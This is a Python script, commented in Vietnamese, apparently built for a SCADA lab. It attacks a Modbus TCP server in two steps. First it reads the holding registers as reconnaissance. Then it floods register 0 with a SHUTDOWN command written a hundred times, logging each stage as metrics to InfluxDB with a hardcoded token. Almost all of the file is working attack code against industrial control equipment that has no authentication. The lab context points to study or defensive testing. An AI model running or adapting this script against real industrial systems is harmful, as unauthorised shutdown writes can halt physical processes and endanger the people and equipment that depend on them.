import time
from pymodbus.client import ModbusTcpClient
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

INFLUX_URL = "http://influxdb:8086"
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)


def push_metric(action, value):
    try:
        point = (
            Point("modbus")
            .tag("container", "modbus-attacker")
            .tag("action", action)
            .field("register_value", int(value))
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"InfluxDB write error: {e}")


def run_modbus_attacker():
    client = ModbusTcpClient('modbus-server', port=502)

    if not client.connect():
        print("Kết nối thất bại (Attacker).")
        return

    print("Kết nối thành công đến Modbus Server! (Attacker)")
    
    while True:
        print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG ---")
        
        # [Giai đoạn 1]: Quét thanh ghi (Reconnaissance)
        print("[PHASE 1] Quét 100 thanh ghi Holding Registers...")
        start_time = time.time()
        try:
            # Đọc 100 thanh ghi từ địa chỉ 0
            result = client.read_holding_registers(address=0, count=99, device_id=1)
            
            if result.isError():
                print(f" Lỗi khi đọc thanh ghi: {result}")
            else:
                elapsed = time.time() - start_time
                print(f" [+] Quét thành công {len(result.registers)} thanh ghi trong {elapsed:.2f}s")
                push_metric("attack_recon", len(result.registers))
        except Exception as e:
            print(f" Lỗi ngoại lệ lúc quét: {e}")
            
        time.sleep(2) # Dừng 2 giây để quan sát trước khi phá
        
        # [Giai đoạn 2]: Tấn công ghi lặp lại (Flood / Unauthorized Write)
        print("\n[PHASE 2] Tấn công DoS: Ghi lệnh SHUTDOWN (99) lặp liên tục 100 lần...")
        success_count = 0
        
        for i in range(100):
            try:
                res = client.write_register(0, 99, device_id=1)
                if not res.isError():
                    success_count += 1
                    # Ghi nhận metric tần suất cao
                    push_metric("write", 99)
                
                # Sleep cực ngắn để tạo lưu lượng cao (flood)
                time.sleep(0.05) 
            except Exception as e:
                print(f" Lỗi ghi ở vòng {i+1}: {e}")
                
        print(f" [+] Giai đoạn 2 hoàn tất. Thành công ghi {success_count}/100 lệnh SHUTDOWN.")
        
        print("--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---\n")
        time.sleep(30)

if __name__ == "__main__":
    run_modbus_attacker()
